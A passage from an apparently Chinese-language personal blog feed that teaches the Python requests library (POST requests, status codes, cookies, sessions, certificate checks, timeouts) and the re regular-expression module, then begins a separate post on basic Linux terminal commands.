</span><br><span class="line">  &quot;origin&quot;: &quot;112.226.8.246&quot;, </span><br><span class="line">  &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;post&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 导入模块</span><br><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line"># 设置data参数</span><br><span class="line">&gt;&gt;&gt; data &#x3D; &#123;&#39;name&#39;:&#39;germey&#39;,&#39;age&#39;:&#39;22&#39;&#125;</span><br><span class="line"># 设置headers</span><br><span class="line">&gt;&gt;&gt; headers &#x3D; &#123;&#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36&#39;&#125;</span><br><span class="line"># 进行psot请求</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.post(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;,data &#x3D; data,headers &#x3D; headers)</span><br><span class="line"># 解析response</span><br><span class="line">&gt;&gt;&gt; print(response.json())</span><br><span class="line"></span><br><span class="line"># 解析之后就变成了dick格式</span><br><span class="line">&#123;&#39;args&#39;: &#123;&#125;, &#39;data&#39;: &#39;&#39;, &#39;files&#39;: &#123;&#125;, &#39;form&#39;: &#123;&#39;age&#39;: &#39;22&#39;, &#39;name&#39;: &#39;germey&#39;&#125;, &#39;headers&#39;: &#123;&#39;Accept&#39;: &#39;*&#x2F;*&#39;, &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;, &#39;Content-Length&#39;: &#39;18&#39;, &#39;Content-Type&#39;: &#39;application&#x2F;x-www-form-urlencoded&#39;, &#39;Host&#39;: &#39;httpbin.org&#39;, &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36&#39;, &#39;X-Amzn-Trace-Id&#39;: &#39;Root&#x3D;1-5e2fde03-cae7a73c2ed8eed413526372&#39;&#125;, &#39;json&#39;: None, &#39;origin&#39;: &#39;112.226.8.246&#39;, &#39;url&#39;: &#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="响应-1"><a href="#响应-1" class="headerlink" title="响应"></a>响应</h3><h4 id="response属性"><a href="#response属性" class="headerlink" title="response属性"></a>response属性</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line"># 隐藏服务器，防止屏蔽</span><br><span class="line">&gt;&gt;&gt; headers &#x3D; &#123;&#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36&#39;&#125;</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.jianshu.com&#39;，headers &#x3D; headers)</span><br><span class="line"># 打印状态码</span><br><span class="line">&gt;&gt;&gt; print(type(response.status_code),response.status_code)</span><br><span class="line"># 打印headers</span><br><span class="line">&gt;&gt;&gt; print(type(response.headers),response.headers)</span><br><span class="line"># 打印cookies</span><br><span class="line">&gt;&gt;&gt; print(type(response.cookies),response.cookies)</span><br><span class="line"># 打印url网址</span><br><span class="line">&gt;&gt;&gt; print(type(response.url),response.url)</span><br><span class="line"># 打印history也就是历史清单</span><br><span class="line">&gt;&gt;&gt; print(type(response.history),response.history)</span><br></pre></td></tr></table></figure>

<h4 id="状态码判断"><a href="#状态码判断" class="headerlink" title="状态码判断"></a>状态码判断</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一些常见的状态码为：</span><br><span class="line">200 - 服务器成功返回网页 </span><br><span class="line">404 - 请求的网页不存在 </span><br><span class="line">503 - 服务不可用 </span><br><span class="line">详细分解：</span><br><span class="line">1xx（临时响应） </span><br><span class="line">表示临时响应并需要请求者继续执行操作的状态代码。</span><br><span class="line">代码 说明 </span><br><span class="line">100 （继续） 请求者应当继续提出请求。服务器返回此代码表示已收到请求的第一部分，正在等待其余部分。 </span><br><span class="line">101 （切换协议） 请求者已要求服务器切换协议，服务器已确认并准备切换。</span><br><span class="line">2xx （成功） </span><br><span class="line">表示成功处理了请求的状态代码。</span><br><span class="line">代码 说明 </span><br><span class="line">200 （成功） 服务器已成功处理了请求。通常，这表示服务器提供了请求的网页。 </span><br><span class="line">201 （已创建） 请求成功并且服务器创建了新的资源。 </span><br><span class="line">202 （已接受） 服务器已接受请求，但尚未处理。 </span><br><span class="line">203 （非授权信息） 服务器已成功处理了请求，但返回的信息可能来自另一来源。 </span><br><span class="line">204 （无内容） 服务器成功处理了请求，但没有返回任何内容。 </span><br><span class="line">205 （重置内容） 服务器成功处理了请求，但没有返回任何内容。 </span><br><span class="line">206 （部分内容） 服务器成功处理了部分 GET 请求。</span><br><span class="line">3xx （重定向） </span><br><span class="line">表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。</span><br><span class="line">代码 说明 </span><br><span class="line">300 （多种选择） 针对请求，服务器可执行多种操作。服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。 </span><br><span class="line">301 （永久移动） 请求的网页已永久移动到新位置。服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。 </span><br><span class="line">302 （临时移动） 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。 </span><br><span class="line">303 （查看其他位置） 请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。 </span><br><span class="line">304 （未修改） 自从上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。 </span><br><span class="line">305 （使用代理） 请求者只能使用代理访问请求的网页。如果服务器返回此响应，还表示请求者应使用代理。 </span><br><span class="line">307 （临时重定向） 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。</span><br><span class="line">4xx（请求错误） </span><br><span class="line">这些状态代码表示请求可能出错，妨碍了服务器的处理。</span><br><span class="line">代码 说明 </span><br><span class="line">400 （错误请求） 服务器不理解请求的语法。 </span><br><span class="line">401 （未授权） 请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。 </span><br><span class="line">403 （禁止） 服务器拒绝请求。 </span><br><span class="line">404 （未找到） 服务器找不到请求的网页。 </span><br><span class="line">405 （方法禁用） 禁用请求中指定的方法。 </span><br><span class="line">406 （不接受） 无法使用请求的内容特性响应请求的网页。 </span><br><span class="line">407 （需要代理授权） 此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。 </span><br><span class="line">408 （请求超时） 服务器等候请求时发生超时。 </span><br><span class="line">409 （冲突） 服务器在完成请求时发生冲突。服务器必须在响应中包含有关冲突的信息。 </span><br><span class="line">410 （已删除） 如果请求的资源已永久删除，服务器就会返回此响应。 </span><br><span class="line">411 （需要有效长度） 服务器不接受不含有效内容长度标头字段的请求。 </span><br><span class="line">412 （未满足前提条件） 服务器未满足请求者在请求中设置的其中一个前提条件。 </span><br><span class="line">413 （请求实体过大） 服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。 </span><br><span class="line">414 （请求的 URI 过长） 请求的 URI（通常为网址）过长，服务器无法处理。 </span><br><span class="line">415 （不支持的媒体类型） 请求的格式不受请求页面的支持。 </span><br><span class="line">416 （请求范围不符合要求） 如果页面无法提供请求的范围，则服务器会返回此状态代码。 </span><br><span class="line">417 （未满足期望值） 服务器未满足”期望”请求标头字段的要求。</span><br><span class="line">5xx（服务器错误） </span><br><span class="line">这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。</span><br><span class="line">代码 说明 </span><br><span class="line">500 （服务器内部错误） 服务器遇到错误，无法完成请求。 </span><br><span class="line">501 （尚未实施） 服务器不具备完成请求的功能。例如，服务器无法识别请求方法时可能会返回此代码。 </span><br><span class="line">502 （错误网关） 服务器作为网关或代理，从上游服务器收到无效响应。 </span><br><span class="line">503 （服务不可用） 服务器目前无法使用（由于超载或停机维护）。通常，这只是暂时状态。 </span><br><span class="line">504 （网关超时） 服务器作为网关或代理，但是没有及时从上游服务器收到请求。 </span><br><span class="line">505 （HTTP 版本不受支持） 服务器不支持请求中所用的 HTTP 协议版本。</span><br><span class="line">HttpWatch状态码Result is</span><br><span class="line">200 - 服务器成功返回网页，客户端请求已成功。 </span><br><span class="line">302 - 对象临时移动。服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。 </span><br><span class="line">304 - 属于重定向。自上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。 </span><br><span class="line">401 - 未授权。请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。 </span><br><span class="line">404 - 未找到。服务器找不到请求的网页。 </span><br><span class="line">2xx - 成功。表示服务器成功地接受了客户端请求。 </span><br><span class="line">3xx - 重定向。表示要完成请求，需要进一步操作。客户端浏览器必须采取更多操作来实现请求。例如，浏览器可能不得不请求服务器上的不同的页面，或通过代理服务器重复该请求。 </span><br><span class="line">4xx - 请求错误。这些状态代码表示请求可能出错，妨碍了服务器的处理。 </span><br><span class="line">5xx - 服务器错误。表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。</span><br></pre></td></tr></table></figure>

<h3 id="高级操作"><a href="#高级操作" class="headerlink" title="高级操作"></a>高级操作</h3><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 导入模块</span><br><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line"># 以只读的方式打开图片</span><br><span class="line">&gt;&gt;&gt; files &#x3D; &#123;&#39;file&#39;:open(&#39;D:&#x2F;&#x2F;1580132124441.png&#39;,&#39;rb&#39;)&#125;</span><br><span class="line"># 选择要上传的网站</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.post(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;,files &#x3D; files)</span><br><span class="line">&gt;&gt;&gt; print(response.text)</span><br></pre></td></tr></table></figure>

<h4 id="获取cookie"><a href="#获取cookie" class="headerlink" title="获取cookie"></a>获取cookie</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 导入模块</span><br><span class="line">import requests</span><br><span class="line"># 请求接收baidu网址</span><br><span class="line">response &#x3D; requests.get(&quot;https:&#x2F;&#x2F;www.baidu.com&quot;)</span><br><span class="line"># 打印cookies</span><br><span class="line">print(response.cookies)</span><br><span class="line"># 进行循环response.cookies.items项目，将key和value合并</span><br><span class="line">for key,value in response.cookies.items():</span><br><span class="line">	print(key + &#39;&#x3D;&#39; + value)</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">&lt;RequestsCookieJar[&lt;Cookie BDORZ&#x3D;27315 for .baidu.com&#x2F;&gt;]&gt;</span><br><span class="line">BDORZ&#x3D;27315</span><br></pre></td></tr></table></figure>

<h4 id="会话维持"><a href="#会话维持" class="headerlink" title="会话维持"></a>会话维持</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">模拟登录</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 导入模块</span><br><span class="line">import requests</span><br><span class="line"># 用requests中的Session()对象</span><br><span class="line">s&#x3D; requests.Session()</span><br><span class="line">s.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#x2F;set&#x2F;number&#x2F;123546465&#39;)</span><br><span class="line">response &#x3D; s.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#39;)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>

<h4 id="证书验证"><a href="#证书验证" class="headerlink" title="证书验证"></a>证书验证</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">#如果证书不存在会报错</span><br><span class="line">response &#x3D; requests.get(&#39;https:&#x2F;&#x2F;www.12306.cn&#39;)</span><br><span class="line">print(response.status_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 将verify设置为False之后就会打印状态码，但还是会提示最好验证证书</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">response &#x3D; requests.get(&#39;https:&#x2F;&#x2F;www.12306.cn&#39;,verify &#x3D; False)</span><br><span class="line">print(response.status_code)</span><br></pre></td></tr></table></figure>

<h4 id="代理设置"><a href="#代理设置" class="headerlink" title="代理设置"></a>代理设置</h4><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1580206554561.png" alt="1580203818631"></p>
<h4 id="超时设置"><a href="#超时设置" class="headerlink" title="超时设置"></a>超时设置</h4><h5 id="限制服务器应答速度"><a href="#限制服务器应答速度" class="headerlink" title="限制服务器应答速度"></a>限制服务器应答速度</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.taobao.com&#39;,timeout &#x3D; 1 )</span><br><span class="line">print(response.status_code)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1580206474221.png" alt="1580206474221"></p>
<h4 id="认证设置"><a href="#认证设置" class="headerlink" title="认证设置"></a>认证设置</h4><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1580203818631.png" alt="1580206554561"></p>
<h4 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h4><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1580223155421.png" alt="1580206689321"></p>
<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><h5 id="正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。-非python独有，re模块实现"><a href="#正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。-非python独有，re模块实现" class="headerlink" title="正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。    非python独有，re模块实现"></a>正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。    非python独有，re模块实现</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1580276050159.png" alt="1580276050159"></p>
<h4 id="re-match"><a href="#re-match" class="headerlink" title="re.match"></a>re.match</h4><h5 id="re-match-尝试从字符串的起始位置匹配一个模式，如果不是从起始位置匹配成功的话，match-就返回none"><a href="#re-match-尝试从字符串的起始位置匹配一个模式，如果不是从起始位置匹配成功的话，match-就返回none" class="headerlink" title="re.match 尝试从字符串的起始位置匹配一个模式，如果不是从起始位置匹配成功的话，match()就返回none."></a>re.match 尝试从字符串的起始位置匹配一个模式，如果不是从起始位置匹配成功的话，match()就返回none.</h5><h5 id="最常规的匹配"><a href="#最常规的匹配" class="headerlink" title="最常规的匹配"></a>最常规的匹配</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 导入 re 模块</span><br><span class="line">&gt;&gt;&gt; import re</span><br><span class="line"># 将字符串赋值给变量content</span><br><span class="line">&gt;&gt;&gt; content &#x3D; &#39;Hello 123 4567 Whord_this is a regex demo&#39;</span><br><span class="line"># 将匹配结果赋值给result变量</span><br><span class="line">&gt;&gt;&gt; result &#x3D; re.match(&quot;^Hello\s\d&#123;3&#125;\s\d&#123;4&#125;\s\w&#123;10&#125;.*demo$&quot;,content)</span><br><span class="line"># 打印result变量</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line"># span表示打印的字符长度</span><br><span class="line">&lt;re.Match object; span&#x3D;(0, 41), match&#x3D;&#39;Hello 123 4567 Whord_this is a regex demo&#39;&gt;</span><br></pre></td></tr></table></figure>

<h5 id="泛匹配"><a href="#泛匹配" class="headerlink" title="泛匹配"></a>泛匹配</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; content &#x3D; &#39;Hello 123 4567 Whord_this is a regex demo&#39;</span><br><span class="line"># 将以Hello开头，demo$结尾中间的字符全都打印了出来</span><br><span class="line">&gt;&gt;&gt; result &#x3D; re.match(&quot;^Hello.*demo$&quot;,content)</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line">&lt;re.Match object; span&#x3D;(0, 41), match&#x3D;&#39;Hello 123 4567 Whord_this is a regex demo&#39;&gt;</span><br></pre></td></tr></table></figure>

<h5 id="匹配目标"><a href="#匹配目标" class="headerlink" title="匹配目标"></a>匹配目标</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; content &#x3D; &#39;Hello 1234567 Whord_this is a regex demo&#39;</span><br><span class="line">&gt;&gt;&gt; result &#x3D; re.match(&quot;^Hello\s(\d+)\sWhord.*demo$&quot;,content)</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line">&lt;re.Match object; span&#x3D;(0, 40), match&#x3D;&#39;Hello 1234567 Whord_this is a regex demo&#39;&gt;</span><br><span class="line"></span><br><span class="line">#如果正则表达式出现小括号，第一个小括号的内容就是group(1) </span><br><span class="line">&gt;&gt;&gt; print(result.group(1))</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure>

<h5 id="贪婪匹配"><a href="#贪婪匹配" class="headerlink" title="贪婪匹配"></a>贪婪匹配</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.*贪婪匹配，尽可能多的匹配，因为其中有一个\d+最少要有一个数字，所以只打印了7</span><br><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; content &#x3D; &#39;Hello 1234567 Whord_this is a regex demo&#39;</span><br><span class="line">&gt;&gt;&gt; result &#x3D; re.match(&quot;^He.*(\d+).*demo$&quot;,content)</span><br><span class="line">&gt;&gt;&gt; print(result.group(1))</span><br><span class="line">7</span><br></pre></td></tr></table></figure>

<h5 id="非贪婪匹配"><a href="#非贪婪匹配" class="headerlink" title="非贪婪匹配"></a>非贪婪匹配</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.*?非贪婪匹配，尽可能少的匹配，看到括号里的\d这个数字了，就停止匹配，这样.*?就只匹配了Hello和空格</span><br><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; content &#x3D; &#39;Hello 1234567 Whord_this is a regex demo&#39;</span><br><span class="line">&gt;&gt;&gt; result &#x3D; re.match(&quot;^He.*?(\d+).*demo$&quot;,content)</span><br><span class="line">&gt;&gt;&gt; print(result.group(1))</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure>

<h5 id="匹配模式"><a href="#匹配模式" class="headerlink" title="匹配模式"></a>匹配模式</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; content &#x3D; &#39;&#39;&#39;Hello 1234567 Whord_this</span><br><span class="line">is a regex demo</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">#re.S就是表示&quot;.&quot;但是这个&quot;.&quot;可以匹配换行符，如果不加re.S的话会报错因为平时的&quot;.&quot;除了换行符，可以匹配任意字符</span><br><span class="line">&gt;&gt;&gt; result &#x3D; re.match(&quot;^He.*?(\d+).*?demo$&quot;,content,re.S)</span><br><span class="line">&gt;&gt;&gt; print(result.group(1))</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure>

<h5 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; content &#x3D; &#39;price is $5.00&#39;</span><br><span class="line">&gt;&gt;&gt; result &#x3D; re.match(&quot;price is \$5\.00&quot;,content)</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line">&lt;re.Match object; span&#x3D;(0, 14), match&#x3D;&#39;price is $5.00&#39;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; result &#x3D; re.match(&quot;price is \$5.00&quot;,content)</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line">&lt;re.Match object; span&#x3D;(0, 14), match&#x3D;&#39;price is $5.00&#39;&gt;</span><br></pre></td></tr></table></figure>

<h5 id="总结-尽量使用泛匹配、使用括号得到匹配目标、尽量使用非贪婪模式、有换行符就用re-S"><a href="#总结-尽量使用泛匹配、使用括号得到匹配目标、尽量使用非贪婪模式、有换行符就用re-S" class="headerlink" title="总结:尽量使用泛匹配、使用括号得到匹配目标、尽量使用非贪婪模式、有换行符就用re.S"></a>总结:尽量使用泛匹配、使用括号得到匹配目标、尽量使用非贪婪模式、有换行符就用re.S</h5><h4 id="re-search方法"><a href="#re-search方法" class="headerlink" title="re.search方法"></a>re.search方法</h4><h5 id="re-search-扫描整个字符串并返回第一个成功的匹配"><a href="#re-search-扫描整个字符串并返回第一个成功的匹配" class="headerlink" title="re.search 扫描整个字符串并返回第一个成功的匹配"></a>re.search 扫描整个字符串并返回第一个成功的匹配</h5><h5 id="re-match-方法是要从其实位置匹配，如果匹配的不是起始位置那么就会返回None"><a href="#re-match-方法是要从其实位置匹配，如果匹配的不是起始位置那么就会返回None" class="headerlink" title="re.match 方法是要从其实位置匹配，如果匹配的不是起始位置那么就会返回None"></a>re.match 方法是要从其实位置匹配，如果匹配的不是起始位置那么就会返回None</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里需要使用re.search方法</span><br><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; content &#x3D; &#39;most recent call last&#39;</span><br><span class="line">&gt;&gt;&gt; content &#x3D; &#39;most recent 1235648 call last demo&#39;</span><br><span class="line">&gt;&gt;&gt; result &#x3D; re.search(&quot;recent.*?(\d+).*?last&quot;,content)</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line">&lt;re.Match object; span&#x3D;(5, 29), match&#x3D;&#39;recent 1235648 call last&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; print(result.group(1))</span><br><span class="line">1235648</span><br></pre></td></tr></table></figure>

<h5 id="总结：为了匹配方便，能用search就不用match"><a href="#总结：为了匹配方便，能用search就不用match" class="headerlink" title="总结：为了匹配方便，能用search就不用match"></a>总结：为了匹配方便，能用search就不用match</h5><h4 id="re-findall方法"><a href="#re-findall方法" class="headerlink" title="re.findall方法"></a>re.findall方法</h4><h5 id="搜索字符串，以列表的形式返回全部能匹配的字串"><a href="#搜索字符串，以列表的形式返回全部能匹配的字串" class="headerlink" title="搜索字符串，以列表的形式返回全部能匹配的字串"></a>搜索字符串，以列表的形式返回全部能匹配的字串</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1580223107107.png" alt="1580223107107"></p>
<h5 id="用findall方法将全部歌名打印出来"><a href="#用findall方法将全部歌名打印出来" class="headerlink" title="用findall方法将全部歌名打印出来"></a>用findall方法将全部歌名打印出来</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1580206689321.png" alt="1580223155421"></p>
<h4 id="re-sub"><a href="#re-sub" class="headerlink" title="re.sub"></a>re.sub</h4><h5 id="替换字符串中每一个匹配的子串后返回替换后的字符串"><a href="#替换字符串中每一个匹配的子串后返回替换后的字符串" class="headerlink" title="替换字符串中每一个匹配的子串后返回替换后的字符串"></a>替换字符串中每一个匹配的子串后返回替换后的字符串</h5><h5 id="用sub去掉a打印li中的-歌名"><a href="#用sub去掉a打印li中的-歌名" class="headerlink" title="用sub去掉a打印li中的 歌名"></a>用sub去掉a打印li中的 歌名</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1580229349011.png" alt="1580229349011"></p>
<h4 id="re-compile"><a href="#re-compile" class="headerlink" title="re.compile"></a>re.compile</h4><h5 id="将正则字符串编译成正则表达式对象"><a href="#将正则字符串编译成正则表达式对象" class="headerlink" title="将正则字符串编译成正则表达式对象"></a>将正则字符串编译成正则表达式对象</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">将一个正则表达式串编译成正则对象，以便于复用该匹配模式</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 导入re模块</span><br><span class="line">&gt;&gt;&gt; import re</span><br><span class="line"># 建立一个字符串赋值给content</span><br><span class="line">&gt;&gt;&gt; content &#x3D; &#39;&#39;&#39;Hello 1234567 Whord_this</span><br><span class="line">is a regex demo</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"># 进行字符串编译成对象，用match方法从开头搜索</span><br><span class="line">&gt;&gt;&gt; pattern &#x3D; re.compile(&quot;Hello.*?demo&quot;,re.S)</span><br><span class="line"># 可以直接调用pattern变量，就不需要在括号里再打一遍代码</span><br><span class="line">&gt;&gt;&gt; result &#x3D; re.match(pattern,content)</span><br><span class="line"># 打印</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line">&lt;re.Match object; span&#x3D;(0, 40), match&#x3D;&#39;Hello 1234567 Whord_this\nis a regex demo&#39;&gt;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>linux笔记 </title>
    <url>/2020/04/03/linux%E7%AC%94%E8%AE%B0%20/</url>
    <content><![CDATA[<h1 id="常用-Linux-命令的基本使用"><a href="#常用-Linux-命令的基本使用" class="headerlink" title="常用 Linux 命令的基本使用"></a>常用 Linux 命令的基本使用</h1><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><ul>
<li>理解学习 Linux 终端命令的原因</li>
<li>常用 Linux 命令体验</li>
</ul>
<h2 id="01-学习-Linux-终端命令的原因"><a href="#01-学习-Linux-终端命令的原因" class="headerlink" title="01. 学习 Linux 终端命令的原因"></a>01. 学习 Linux 终端命令的原因</h2><ul>
<li>Linux 刚面世时并没有图形界面，所有的操作全靠命令完成，如 <strong>磁盘操作</strong>、<strong>文件存取</strong>、<strong>目录操作</strong>、<strong>进程管理</strong>、<strong>文件权限</strong> 设定等</li>
<li>在职场中，大量的 <strong>服务器维护工作</strong> 都是在 <strong>远程</strong> 通过 <strong>SSH 客户端</strong> 来完成的，并没有图形界面，所有的维护工作都需要通过命令来完成</li>
<li>在职场中，作为后端程序员，必须要或多或少的掌握一些 Linux 常用的终端命令</li>
<li>Linux 发行版本的命令大概有 200 多个，但是常用的命令只有 10 多个而已</li>
</ul>
<blockquote>
<p>学习终端命令的技巧：</p>
<ul>
<li>不需要死记硬背，对于常用命令，用的多了，自然就记住了</li>
<li>不要尝试一次学会所有的命令，有些命令是非常不常用的，临时遇到，临时百度就可以</li>
</ul>
</blockquote>
<h2 id="02-常用-Linux-命令的基本使用"><a href="#02-常用-Linux-命令的基本使用" class="headerlink" title="02. 常用 Linux 命令的基本使用"></a>02. 常用 Linux 命令的基本使用</h2><table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">命令</th>
<th align="left">对应英文</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">01</td>
<td align="left">ls</td>
<td align="left">list</td>
<td align="left">查看当前文件夹下的内容</td>
</tr>
<tr>
<td align="left">02</td>
<td align="left">pwd</td>
<td align="left">print wrok directory</td>
<td align="left">查看当前所在文件夹</td>
</tr>
<tr>
<td align="left">03</td>
<td align="left">cd [目录名]</td>
<td align="left">change directory</td>
<td align="left">切换文件夹</td>
</tr>
<tr>
<td align="left">04</td>
<td align="left">touch [文件名]</td>
<td align="left">touch</td>
<td align="left">如果文件不存在，新建文件</td>
</tr>
<tr>
<td align="left">05</td>
<td align="left">mkdir [目录名]</td>
<td align="left">make directory</td>
<td align="left">创建目录</td>
</tr>
<tr>
<td align="left">06</td>
<td align="left">rm [文件名]</td>
<td align="left">remove</td>
<td align="left">删除指定的文件名</td>
</tr>
<tr>
<td align="left">07</td>
<td align="left">clear</td>
<td align="left">clear</td>
<td align="left">清屏</td>
</tr>
</tbody></table>
<blockquote>
<p>小技巧</p>
<ul>
<li><code>ctrl + shift + =</code> <strong>放大</strong>终端窗口的字体显示</li>
<li><code>ctrl + -</code> <strong>缩小</strong>终端窗口的字体显示</li>
</ul>
</blockquote>
<h3 id="03-自动补全"><a href="#03-自动补全" class="headerlink" title="03. 自动补全"></a>03. 自动补全</h3><ul>
<li><p>在敲出文件目录命令的前几个字母之后，按下 tab 键  </p>
<ul>
<li>如果输入的没有歧义，系统会自动补全</li>
<li>如果还存在其他 <code>文件</code>／<code>目录</code>／<code>命令</code>，再按一下 <code>tab</code> 键，系统会提示可能存在的命令</li>
</ul>
</li>
</ul>
<blockquote>
<p>小技巧</p>
<ul>
<li>按 <code>上</code>／<code>下</code> 光标键可以在曾经使用过的命令之间来回切换</li>
<li>如果想要退出选择，并且不想执行当前选中的命令，可以按 <code>ctrl + c</code></li>
</ul>
</blockquote>
<h1 id="Linux-终端命令格式"><a href="#Linux-终端命令格式" class="headerlink" title="Linux 终端命令格式"></a>Linux 终端命令格式</h1><h2 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h2><ul>
<li>了解终端命令格式</li>
<li>知道如何查阅终端命令帮助信息</li>
</ul>
